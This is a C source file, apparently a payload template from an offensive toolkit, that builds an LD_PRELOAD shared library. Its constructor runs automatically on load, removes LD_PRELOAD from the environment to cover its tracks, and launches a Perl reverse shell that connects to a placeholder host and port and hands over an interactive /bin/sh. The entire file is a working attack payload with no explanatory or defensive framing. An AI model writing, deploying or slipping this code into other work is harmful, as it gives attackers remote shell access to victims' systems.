#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int __attribute__((__constructor__)) init(void)
{
	unsetenv("LD_PRELOAD");
 	system("perl -e 'use Socket;$i=\"{{HOST}}\";$p={{PORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'");
}
